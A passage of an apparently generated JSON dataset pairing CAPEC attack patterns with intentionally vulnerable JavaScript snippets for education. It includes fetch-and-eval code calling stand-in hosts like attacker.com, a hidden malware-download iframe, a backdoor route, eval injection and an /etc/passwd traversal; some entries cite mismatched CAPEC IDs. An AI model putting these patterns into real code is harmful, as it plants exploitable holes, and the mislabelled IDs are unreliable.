        "code_snippet": "const sendPhishingSMS = (phoneNumber) => {\n  const phishingLink = 'http://malicious-site.com';\n  const message = `Your account has been compromised. Please visit ${phishingLink} to secure your account.`;\n  // Simulate sending SMS\n  console.log(`Sending SMS to ${phoneNumber}: ${message}`);\n};\n\nconst simulateUserInteraction = (userInput) => {\n  const fakeLoginPage = 'http://malicious-site.com/login';\n  if (userInput === 'click') {\n    console.log(`User is redirected to ${fakeLoginPage}`);\n    // Simulate user entering credentials\n    const userCredentials = { username: 'user', password: 'password123' };\n    console.log('User entered credentials:', userCredentials);\n    // Simulate sending credentials to attacker\n    console.log('Sending credentials to attacker...');\n  }\n};\n\n// Example usage\nsendPhishingSMS('+1234567890');\nsimulateUserInteraction('click');",
        "description": "This JavaScript code snippet demonstrates a mobile phishing attack. The `sendPhishingSMS` function simulates sending a phishing SMS to a user's phone number, containing a link to a malicious site. The `simulateUserInteraction` function simulates the user clicking the link and entering their credentials on a fake login page, which are then sent to the attacker. This code embodies the main idea of the CAPEC by illustrating how an attacker might use SMS to initiate a phishing attack, leveraging CWE-451 (UI Misrepresentation), CWE-290 (Authentication Bypass by Spoofing), and CWE-309 (Use of Password System for Primary Authentication)."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  const basePath = '/var/www/app/data/';\n  const filePath = path.join(basePath, userInput);\n\n  if (!filePath.startsWith(basePath)) {\n    throw new Error('Path traversal attempt detected!');\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('../../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a potential file manipulation vulnerability, specifically focusing on CWE-22 (Path Traversal). The `readFile` function takes user input to construct a file path and reads the file's content. The `path.join` method is used to concatenate the base path with user input, but without proper validation, this can lead to path traversal attacks. The code attempts to mitigate this by checking if the constructed file path starts with the base path, but this check can be bypassed if not implemented correctly. This snippet embodies the main idea of CAPEC-176 (File Manipulation) by showing how improper handling of file paths can lead to security issues such as unauthorized file access."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "const systemConfig = { secureMode: true, userRole: 'admin' };\n\nfunction resetSystem() {\n  // CWE-306: Missing Authentication for Critical Function\n  // No authentication check before resetting the system\n  systemConfig.secureMode = false;\n  systemConfig.userRole = 'guest';\n  console.log('System reset to default values:', systemConfig);\n}\n\n// Simulate a power state transition\nfunction powerStateTransition() {\n  // CWE-1232: Improper Lock Behavior After Power State Transition\n  // Configuration becomes changeable after power state transition\n  resetSystem();\n}\n\n// Simulate a power save/restore operation\nfunction powerSaveRestore() {\n  // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n  // Configuration state integrity is not maintained\n  console.log('Entering power save mode...');\n  setTimeout(() => {\n    console.log('Restoring from power save mode...');\n    powerStateTransition();\n  }, 1000);\n}\n\n// Trigger the power save/restore operation\npowerSaveRestore();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can force the system to reset values, leveraging potential weaknesses in the system's configuration. The `resetSystem` function resets critical system configuration values without any authentication check (CWE-306). The `powerStateTransition` function simulates a power state transition where the configuration becomes changeable (CWE-1232). The `powerSaveRestore` function simulates a power save/restore operation where the integrity of the configuration state is not maintained (CWE-1304). This code embodies the main idea of the CAPEC by showing how an attacker can exploit these weaknesses to reset the system to a previous state."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "const sensitiveData = 'SecretKey123';\n\nfunction debugMode() {\n    console.log('Debug Mode Activated');\n    console.log('Sensitive Data:', sensitiveData);\n}\n\n// Simulate a condition where debug mode is activated\nif (process.env.DEBUG === 'true') {\n    debugMode();\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is exposed through a debug mode, embodying the concept of 'White Box Reverse Engineering'. The 'sensitiveData' variable holds a secret key, and the 'debugMode' function logs this sensitive data to the console. The debug mode is conditionally activated based on an environment variable 'DEBUG'. This represents CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). An attacker with access to the executable could reverse engineer the code, discover the debug mode, and activate it to expose sensitive information."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create a file with an alternate data stream\nfunction createADS(filePath, streamName, data) {\n  const adsPath = `${filePath}:${streamName}`;\n  fs.writeFileSync(adsPath, data);\n}\n\n// Function to read data from an alternate data stream\nfunction readADS(filePath, streamName) {\n  const adsPath = `${filePath}:${streamName}`;\n  return fs.readFileSync(adsPath, 'utf8');\n}\n\n// Example usage\nconst filePath = path.join(__dirname, 'example.txt');\nconst streamName = 'hiddenStream';\nconst data = 'Sensitive data hidden in ADS';\n\n// Create a file and hide data in an alternate data stream\nfs.writeFileSync(filePath, 'This is a normal file content');\ncreateADS(filePath, streamName, data);\n\n// Read the hidden data from the alternate data stream\nconst hiddenData = readADS(filePath, streamName);\nconsole.log('Hidden Data:', hiddenData);",
        "description": "This JavaScript code snippet demonstrates how to create and read an Alternate Data Stream (ADS) in a file on an NTFS filesystem. The `createADS` function hides sensitive data in an ADS, while the `readADS` function retrieves it. This embodies the CAPEC concept of using ADS to hide data from normal system utilities, making it difficult to detect. The code also touches on related CWEs by showing how sensitive information can be improperly stored and potentially accessed by unauthorized actors if not handled correctly."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated sensitive information\nconst sensitiveInfo = {\n  adminPassword: 'superSecret123',\n  userEmails: ['user1@example.com', 'user2@example.com']\n};\n\n// Endpoint that exposes sensitive information\napp.get('/info', (req, res) => {\n  if (req.query.token === 'validToken') {\n    res.json(sensitiveInfo);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\n// Endpoint with observable behavioral discrepancy\napp.get('/status', (req, res) => {\n  if (req.query.debug === 'true') {\n    res.send('Debug mode enabled');\n  } else {\n    res.send('Running normally');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two endpoints. The '/info' endpoint exposes sensitive information (admin password and user emails) if a valid token is provided, demonstrating CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The '/status' endpoint shows different responses based on the 'debug' query parameter, illustrating CWE-205 (Observable Behavioral Discrepancy). This discrepancy can reveal internal states or decision processes to an attacker, aligning with the main idea of CAPEC Footprinting, where an adversary probes and explores to identify constituents and properties of the target."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/?query=sensitiveInfo',\n  method: 'GET',\n  headers: {\n    'User-Agent': 'Mozilla/5.0'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response Headers:', res.headers);\n    console.log('Response Body:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP GET request to a web application, which is a common technique used in web application fingerprinting. The request includes a sensitive query string, which is a vulnerability (CWE-598). The response headers and body are logged, potentially exposing sensitive system information (CWE-497, CWE-209). The code also highlights the excessive attack surface (CWE-1125) by making an unverified request to the server. This snippet embodies the main idea of CAPEC-170 by probing the web application to gather information that could be used for further targeted attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // CWE-95: Eval Injection\n    eval(input);\n}\n\nfunction main() {\n    // CWE-627: Dynamic Variable Evaluation\n    var userVarName = 'userInput';\n    window[userVarName] = 'alert(\"Hacked!\")';\n\n    // CWE-914: Improper Control of Dynamically-Identified Variables\n    processUserInput(window[userVarName]);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC 'Variable Manipulation' by showcasing improper control of dynamically-identified variables and dynamic evaluation of code. The `processUserInput` function uses `eval`, which is susceptible to injection attacks (CWE-95). In the `main` function, a variable name is dynamically created and assigned a malicious script (CWE-627). This variable is then passed to the `processUserInput` function, which evaluates it, leading to potential execution of arbitrary code. This example highlights the risks of using dynamic variable names and `eval` without proper validation and sanitization."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var hiddenFrame = document.createElement('iframe');\n  hiddenFrame.style.display = 'none';\n  hiddenFrame.src = 'http://malicious-site.com/download-malware';\n  document.body.appendChild(hiddenFrame);\n});",
        "description": "This JavaScript code snippet demonstrates an action spoofing attack. When a user clicks on a button with the ID 'submitButton', they expect to submit a form or perform a benign action. However, the code creates an invisible iframe that initiates a request to a malicious site, which could download malware. This embodies the main idea of CAPEC-139 (Action Spoofing) by tricking the user into performing an unintended action. The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by hiding the true action behind a seemingly harmless button click."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "const flashVars = new URLSearchParams(window.location.search);\nconst flashParam = flashVars.get('flashParam');\n\n// CWE-88: Argument Injection\nconst command = `someCommand --option ${flashParam}`;\nexecuteCommand(command);\n\n// CWE-942: Permissive Cross-domain Policy\nconst crossDomainPolicy = `<?xml version=\"1.0\"?>\n<!DOCTYPE cross-domain-policy SYSTEM \"http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd\">\n<cross-domain-policy>\n  <allow-access-from domain=\"*\" />\n</cross-domain-policy>`;\ndocument.write(crossDomainPolicy);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfunction uploadFile(file) {\n  const formData = new FormData();\n  formData.append('file', file);\n  fetch('/upload', { method: 'POST', body: formData });\n}\n\n// CWE-1336: Improper Neutralization in Template Engine\nconst template = `<div>${flashParam}</div>`;\ndocument.body.innerHTML = template;",
        "description": "This JavaScript code snippet demonstrates a Flash Parameter Injection vulnerability by improperly handling user input from URL parameters and using it in various contexts without proper validation or sanitization. The code includes several related weaknesses:\n\n1. CWE-88 (Argument Injection): Constructs a command string using user input without proper delimitation, allowing potential injection of malicious arguments.\n2. CWE-942 (Permissive Cross-domain Policy): Writes a permissive cross-domain policy to the document, allowing access from any domain, which can be exploited by attackers.\n3. CWE-434 (Unrestricted Upload of File with Dangerous Type): Allows file uploads without restricting file types, potentially enabling the upload of malicious files.\n4. CWE-1336 (Improper Neutralization in Template Engine): Inserts user input directly into an HTML template without neutralizing special characters, leading to potential injection attacks.\n\nThe code represents the main idea of Flash Parameter Injection by showing how improper data validation can lead to various security vulnerabilities when user input is used in different contexts within a web application."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst vm = require('vm');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const scriptUrl = queryObject.scriptUrl;\n\n  if (scriptUrl) {\n    http.get(scriptUrl, (response) => {\n      let scriptData = '';\n      response.on('data', (chunk) => { scriptData += chunk; });\n      response.on('end', () => {\n        try {\n          vm.runInThisContext(scriptData);\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end('Script executed successfully');\n        } catch (e) {\n          res.writeHead(500, {'Content-Type': 'text/plain'});\n          res.end('Script execution failed');\n        }\n      });\n    }).on('error', (e) => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Failed to retrieve script');\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No script URL provided');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters to extract a 'scriptUrl' parameter, which is expected to be a URL pointing to a JavaScript file. The server then retrieves the script from the provided URL and executes it using the 'vm.runInThisContext' method. This embodies the main idea of CAPEC-242 (Code Inclusion) by demonstrating how an adversary could exploit a weakness to force arbitrary code to be retrieved from a remote location and executed. The code is vulnerable to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports and executes code from an external source without proper validation. It also touches on CWE-506 (Embedded Malicious Code) and CWE-94 (Code Injection) as the retrieved code could be malicious or crafted to inject harmful behavior. Additionally, it relates to CWE-98 (PHP Remote File Inclusion) and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by improperly handling external input and dynamically executing it."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Path to the configuration file\nconst configFilePath = '/path/to/config.json';\n\n// Function to read and parse the configuration file\nfunction readConfig() {\n  try {\n    const configData = fs.readFileSync(configFilePath, 'utf8');\n    const config = JSON.parse(configData);\n    return config;\n  } catch (err) {\n    console.error('Error reading configuration file:', err);\n    return null;\n  }\n}\n\n// Function to modify a configuration setting\nfunction modifyConfigSetting(key, value) {\n  const config = readConfig();\n  if (config) {\n    config[key] = value;\n    try {\n      fs.writeFileSync(configFilePath, JSON.stringify(config, null, 2), 'utf8');\n      console.log('Configuration updated successfully');\n    } catch (err) {\n      console.error('Error writing configuration file:', err);\n    }\n  }\n}\n\n// Example usage: Modify a configuration setting\nmodifyConfigSetting('settingKey', 'newValue');",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to Configuration/Environment Manipulation (CAPEC-15). The code reads a configuration file, modifies a specified setting, and writes the updated configuration back to the file. This represents CWE-15 (External Control of System or Configuration Setting) as it allows external control over the configuration settings. If an attacker gains access to this code or the configuration file, they could manipulate the application's behavior by altering the configuration settings. The code does not include any security measures to protect the integrity of the configuration file, making it susceptible to unauthorized modifications."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configName) {\n  const directories = ['/etc/app/', './user/config/'];\n  for (const dir of directories) {\n    const filePath = path.join(dir, configName);\n    if (fs.existsSync(filePath)) {\n      return fs.readFileSync(filePath, 'utf8');\n    }\n  }\n  throw new Error('Config file not found');\n}\n\n// Usage\ntry {\n  const config = loadConfig('appConfig.json');\n  console.log('Config loaded:', config);\n} catch (err) {\n  console.error(err.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker can exploit the file location algorithm to load a malicious file instead of a legitimate one. The `loadConfig` function searches for a configuration file named `configName` in a list of directories. If an attacker places a malicious `appConfig.json` file in the `./user/config/` directory, it will be loaded instead of the legitimate file in `/etc/app/`. This embodies the CAPEC idea of creating files with the same name as protected files and placing them in directories that are searched first. The related CWEs are represented by the reliance on file names and paths, and the potential for external control over these paths."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "const urlParams = new URLSearchParams(window.location.search);\nconst targetUrl = urlParams.get('target');\n\nif (targetUrl) {\n  const flashObject = `<object type=\"application/x-shockwave-flash\" data=\"${targetUrl}\"></object>`;\n  document.body.innerHTML = flashObject;\n}",
        "description": "This JavaScript code snippet demonstrates a potential Cross-Site Flashing vulnerability. It extracts a 'target' parameter from the URL query string and uses it to dynamically create a Flash object. The Flash object references an external URL specified by the attacker. This can lead to the execution of arbitrary Flash content, exploiting native Flash functionality in the client browser. The code also touches on related CWEs: CWE-601 (Open Redirect) by accepting a user-controlled URL, CWE-79 (Cross-site Scripting) by injecting user input into the HTML without proper sanitization, and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax) by potentially allowing malicious Flash content to be loaded."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "const sensitiveData = 'user=admin&password=secret';\nfetch(`http://example.com/api/getData?${sensitiveData}`, {\n  method: 'GET',\n  credentials: 'include'\n})\n.then(response => response.json())\n.then(data => {\n  document.getElementById('content').innerHTML = data.content;\n})\n.catch(error => console.error('Error:', error));\n\n// Storing sensitive data in a cookie\ndocument.cookie = `sessionToken=${sensitiveData}; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT;`;\n\n// Storing sensitive file under web root\nconst fs = require('fs');\nfs.writeFileSync('/var/www/html/sensitive.txt', sensitiveData);",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly' and the associated CWEs. The code makes a GET request to a micro-service endpoint, including sensitive information in the query string (CWE-598). It then updates a portion of the web page with the response data, which could expose the micro-service to further exploitation. Additionally, the code stores sensitive data in a persistent cookie (CWE-539) and writes a file containing sensitive data under the web root (CWE-219). These practices can lead to unauthorized access and exploitation of sensitive information."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check user role\nfunction checkUserRole(req, res, next) {\n  if (req.user && req.user.role === 'admin') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Incorrectly configured access control\napp.get('/admin', (req, res) => {\n  // Missing checkUserRole middleware\n  res.send('Welcome to the admin panel');\n});\n\n// Correctly configured access control\napp.get('/secure-admin', checkUserRole, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates an incorrectly configured access control scenario where the '/admin' route does not use the 'checkUserRole' middleware to verify if the user has the 'admin' role, allowing unauthorized access. In contrast, the '/secure-admin' route correctly uses the 'checkUserRole' middleware to ensure only users with the 'admin' role can access it. This example embodies the main idea of the CAPEC by showing how an attacker could exploit a misconfiguration in access control to gain unauthorized access. The related CWEs provide additional context on the importance of correctly implementing and configuring access controls to protect sensitive functionality."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "/* Vulnerable Code: Flash File Overlay for Clickjacking */\n\n// HTML part\nconst iframe = document.createElement('iframe');\niframe.src = 'https://trusted-site.com';\niframe.style.position = 'absolute';\niframe.style.top = '0';\niframe.style.left = '0';\niframe.style.width = '100%';\niframe.style.height = '100%';\niframe.style.opacity = '0'; // Make the iframe transparent\niframe.style.zIndex = '9999'; // Ensure it is on top\n\n// Flash overlay part\nconst flashOverlay = document.createElement('object');\nflashOverlay.data = 'malicious-overlay.swf';\nflashOverlay.type = 'application/x-shockwave-flash';\nflashOverlay.style.position = 'absolute';\nflashOverlay.style.top = '0';\nflashOverlay.style.left = '0';\nflashOverlay.style.width = '100%';\nflashOverlay.style.height = '100%';\nflashOverlay.style.zIndex = '10000'; // Ensure it is above the iframe\n\n// Append both to the body\nconst body = document.getElementsByTagName('body')[0];\nbody.appendChild(iframe);\nbody.appendChild(flashOverlay);",
        "description": "This JavaScript code snippet demonstrates a Flash File Overlay attack, which is a form of clickjacking. The code creates an iframe that loads a trusted site and makes it transparent by setting its opacity to 0. A Flash object is then created and positioned on top of the iframe. The Flash object captures user interactions, such as clicks, and can perform actions that the attacker desires. This attack leverages several weaknesses: improper restriction of rendered UI layers or frames (CWE-1021), permissive cross-domain policy (CWE-942), and unrestricted upload of dangerous files (CWE-434). The Flash overlay can intercept user actions intended for the underlying trusted site, leading to potential security breaches."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "function loadFlashContent(url) {\n  if (!url.endsWith('.swf')) {\n    throw new Error('Invalid file type');\n  }\n  var flashObject = document.createElement('object');\n  flashObject.data = url;\n  document.body.appendChild(flashObject);\n}\n\n// Example usage\nvar userProvidedUrl = 'http://attacker.com/malicious.swf';\nloadFlashContent(userProvidedUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of loading Flash content based on user-provided input. The function `loadFlashContent` takes a URL as an argument and checks if it ends with '.swf' to ensure it is a Flash file. However, this simplistic validation is insufficient and can be easily bypassed, leading to potential security risks. The code then creates an `object` element and sets its `data` attribute to the provided URL, embedding the Flash content into the webpage. This represents the 'Flash Injection' attack described in the CAPEC, where an attacker can trick a victim into executing malicious Flash content. The related CWEs are reflected in the improper input validation (CWE-20), incomplete list of disallowed inputs (CWE-184), and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst net = require('net');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const email = queryObject.email;\n  const command = `FETCH ${email}`;\n\n  const client = net.createConnection({ port: 143, host: 'localhost' }, () => {\n    client.write(command);\n  });\n\n  client.on('data', (data) => {\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(data.toString());\n  });\n\n  client.on('error', (err) => {\n    res.writeHead(500, { 'Content-Type': 'text/plain' });\n    res.end('Internal Server Error');\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet sets up a basic HTTP server that listens for incoming requests. It parses the query parameters to extract an 'email' parameter and constructs an IMAP command using this parameter. The command is then sent to a local IMAP server via a TCP connection. The response from the IMAP server is sent back to the client. This code is vulnerable to IMAP/SMTP command injection (CAPEC-138) because it directly incorporates user input into the command without proper sanitization (CWE-77). Additionally, it does not properly handle encoding or escaping of the output (CWE-116), and it exposes error messages that could reveal sensitive information (CWE-209)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious-code.js', (res) => {\n  if (res.statusCode !== 200) {\n    console.error('Failed to download code');\n    return;\n  }\n\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('downloaded-code.js', data, (err) => {\n      if (err) {\n        console.error('Failed to save code');\n        return;\n      }\n      console.log('Code downloaded and saved. Executing...');\n      require('./downloaded-code.js');\n    });\n  });\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a software integrity attack by downloading and executing code from a remote location without verifying its origin or integrity (CWE-494). The code uses the 'http' module to fetch a JavaScript file from a specified URL and saves it to the local filesystem. It then immediately executes the downloaded code using 'require', which could potentially contain embedded malicious code (CWE-506). This represents a significant risk as the integrity of the software is compromised, allowing an attacker to execute arbitrary code on the system."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "function downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Download failed:', error));\n}\n\n// Example usage\nconst maliciousUrl = 'http://attacker.com/malicious.js';\ndownloadAndExecute(maliciousUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function `downloadAndExecute` that fetches code from a given URL and executes it using `eval`. This embodies the CAPEC 'Malicious Software Download' by showing how an attacker can deceive a user or an automated process into downloading and executing dangerous code from an attacker-controlled source. The code lacks integrity checks (CWE-494), making it susceptible to executing malicious code. The example usage shows how a malicious URL can be passed to the function, leading to potential execution of harmful scripts."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nfunction downloadAndUpdate(url, dest) {\n  const file = fs.createWriteStream(dest);\n  https.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        console.log('Update downloaded and installed.');\n        require(dest); // Execute the downloaded file\n      });\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n}\n\ndownloadAndUpdate('https://malicious.example.com/update.js', 'update.js');",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads a file from a specified URL and executes it without verifying the origin or integrity of the code. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user or automated process into downloading and running malicious code. The code also touches on related CWEs: CWE-494 (Download of Code Without Integrity Check) by not verifying the downloaded file, CWE-506 (Embedded Malicious Code) by potentially downloading malicious code, and CWE-507 (Trojan Horse) by executing code that could contain hidden malicious functionality."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst updateUrl = 'http://malicious-server.com/update';\n\nhttp.get(updateUrl, (res) => {\n  if (res.statusCode !== 200) {\n    console.error('Failed to download update');\n    return;\n  }\n\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // No integrity check or authentication\n    fs.writeFile('/path/to/update', data, (err) => {\n      if (err) {\n        console.error('Failed to write update');\n      } else {\n        console.log('Update applied successfully');\n      }\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading update:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The code downloads an update from a specified URL and writes it to a file without performing any integrity checks or authentication. This embodies the CAPEC 'Malicious Automated Software Update via Redirection' by showing how an attacker could exploit the lack of proper server authentication and integrity validation to introduce malicious code. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the absence of any verification of the downloaded data, CWE-294 (Authentication Bypass by Capture-replay) is implied by the lack of secure authentication mechanisms, CWE-602 (Client-Side Enforcement of Server-Side Security) is represented by the client handling security-critical operations, CWE-506 (Embedded Malicious Code) is the potential result of downloading and executing unverified code, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is demonstrated by the reliance on untrusted data from the update URL."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nconst algorithm = 'des-ecb'; // DES is considered weak\nconst key = Buffer.from('12345678'); // Weak key\nconst plaintext = 'Sensitive Information';\n\nconst cipher = crypto.createCipheriv(algorithm, key, null);\nlet encrypted = cipher.update(plaintext, 'utf8', 'hex');\nencrypted += cipher.final('hex');\nconsole.log('Encrypted:', encrypted);\n\n// Exposing sensitive system information (CWE-497)\nconsole.log('System Info:', process.env);\n\n// Undocumented feature (CWE-1242)\nfunction undocumentedFeature() {\n  console.log('This is an undocumented feature.');\n}\nundocumentedFeature();\n\n// Security-critical code that might be optimized away (CWE-1037)\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Security check: Not in production mode');\n}",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to reverse engineering and the associated CWEs. It uses a weak cryptographic algorithm (DES) to encrypt sensitive information, which can be easily broken (CWE-327). It exposes sensitive system information by logging environment variables (CWE-497). It includes an undocumented feature that could be exploited (CWE-1242). Finally, it contains a security-critical check that might be optimized away by the processor in a production environment (CWE-1037). This code exemplifies how reverse engineering can exploit these weaknesses to understand and potentially compromise the system."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "function authenticate(userInput) {\n  const secretToken = 's3cr3t';\n  let isAuthenticated = false;\n  if (userInput === secretToken) {\n    isAuthenticated = true;\n  }\n  console.log(isAuthenticated ? 'Access granted' : 'Access denied');\n  return isAuthenticated;\n}\n\n// Simulate power consumption logging\nfunction logPowerConsumption() {\n  const powerConsumption = Math.random() * 100;\n  console.log(`Power consumption: ${powerConsumption}W`);\n  return powerConsumption;\n}\n\n// Example usage\nconst userInput = 'userInputToken';\nauthenticate(userInput);\nlogPowerConsumption();",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to black box reverse engineering and side-channel attacks. The `authenticate` function checks if the user input matches a hardcoded secret token. The `logPowerConsumption` function simulates logging of power consumption, which could be monitored by an attacker to infer the secret token based on power usage patterns during the authentication process. This example embodies the CAPEC concept by showing how observable discrepancies and physical side channels can expose sensitive information, making the system vulnerable to reverse engineering."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// Hidden functionality: Undocumented backdoor\nfunction hiddenBackdoor(req, res) {\n  if (req.url === '/hidden' && req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hidden functionality accessed');\n  }\n}\n\n// Download code without integrity check\nfunction downloadAndExecute(url) {\n  http.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => { data += chunk; });\n    response.on('end', () => {\n      eval(data); // Dangerous: executing downloaded code without integrity check\n    });\n  });\n}\n\n// Expose sensitive system information\nfunction exposeSensitiveInfo(req, res) {\n  if (req.url === '/sensitive' && req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Sensitive Info: ${process.env.SENSITIVE_INFO}`); // Exposing sensitive info\n  }\n}\n\nconst server = http.createServer((req, res) => {\n  hiddenBackdoor(req, res);\n  exposeSensitiveInfo(req, res);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n  // Example of downloading and executing code without integrity check\n  downloadAndExecute('http://example.com/malicious.js');\n});",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC description of reverse engineering an executable to expose hidden functionality. The code includes: 1) A hidden backdoor that can be accessed via a specific URL, representing hidden functionality (CWE-912). 2) A function that downloads and executes code from a remote location without verifying its integrity, representing the download of code without integrity check (CWE-494). 3) A function that exposes sensitive system information to unauthorized users, representing the exposure of sensitive system information (CWE-497). These vulnerabilities can be exploited by an attacker to reverse engineer the application and discover hidden or undocumented functionalities, potentially leading to further exploitation."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
